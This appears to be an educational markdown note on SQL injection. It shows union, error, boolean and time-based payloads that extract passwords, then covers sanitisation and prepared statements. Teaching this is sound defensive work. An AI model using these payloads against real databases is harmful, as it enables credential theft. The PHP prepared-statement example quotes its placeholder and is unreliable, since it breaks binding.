# SQL Injections

SQL Injection is an internet attack where a malicious actor write SQL code and inputs it in a form field that  queries the database, allowing him/her to query your database directly.

## Union Based Injections

   The attacker uses a `UNION` to create a separate `SELECT` query, which allows for the stealing of data.

   The database query may be constructed like:

```sql
query = "SELECT product_name, product_cost, product_description FROM product_table WHERE product_name = " + USER_INPUT + "'";
```

The attacker could add

```sql
soap' UNION SELECT username,password,NULL FROM user_table;-- -
```

Creating the following database query:

```sql
SELECT product_name, product_cost, product_description 
FROM product_table 
WHERE product_name = 'soap' 
UNION 
SELECT username,password, NULL 
FROM user_table;-- -';
```

## Error-Based Injections

Attacker forces the application to return an error with sensitive data.

```sql
-- input
asdf' UNION select 1, exp(~(select*from(SELECT Password FROM profiles WHERE ID=1)x)); -- -

-- query
SELECT user_id FROM users WHERE username='asdf' UNION select 1, exp(~(select*from(SELECT Password FROM profiles WHERE ID=1)x)); -- -

-- Error returned
Database access error. Description: DOUBLE value is out of range in 'exp(~((select 'SUP3r_S3cur3_P@a55w0rd!' from dual)))'<?xml version='1.0' encoding='UTF-8'?><ray><result value="Error saving setting." status="failed" /></ray>
```

## Boolean-Based Injections

The attacker injects SQL statements that confirm true/false questions about the database.

Especially useful to find the name of a database table. By comparing how the browser responds to true and false statements in queries.

```sql
-- Query:
SELECT username, email FROM users WHERE id = '[USER INPUT]';

-- Input
1' AND '1' = '2

-- Final result
SELECT username, email FROM users WHERE id = '1' AND '1' = '2';
```

## Time-Based Injections

Even without a direct visible response, attackers can make inferences based on how long responses take by using built in SQL functions like `SLEEP()` and `BENCHMARK()` .

```sql
-- Initial query
SELECT id FROM users WHERE username = 'USER';

-- Attacker input
a' OR IF((SELECT password FROM users WHERE username='admin')='P@ssw0rd123', SLEEP(5), NULL);-- -

-- Final Query
SELECT id FROM users WHERE username = 'a' OR IF((SELECT password FROM users WHERE username='admin')='P@ssw0rd123', SLEEP(5), NULL);-- -';
```

If there is a 5-second delay, the attacker confirms that the password is correct.

## Out-Of-Band SQL Injections

The rarest, and hardest to pull off type of attack. This is where an attacker gets the database to send its results over a different channel to an attacker-controlled server.

The permissions on the database would have to be permissive and would require an attacker to bypass firewalls and other security measures.

## Preventing SQL Injection

### Sanitation

Sanitation is the removal of dangerous character from a user's input. Characters like `'` `;` and `-//` all allow an attacker to extend the database query, potentially giving them access to the system.

This is a good start but it's not foolproof.

### Prepared Statements

A far more effective strategy is using prepared statements. This strategy involves giving the database a query ahead of time. The database will then know the beginning to the end of the query, and where the parameter is. So even if a user input contains SQL syntax, it will still be read as a parameter.

This is nearly fool-proof.

Here's an example in PHP

```php
$username= $_GET['user'];
$stmt = $conn->prepare("SELECT * FROM Users WHERE name = '?'");
$stmt->bind_param("s", $username);
$stmt->execute();
```
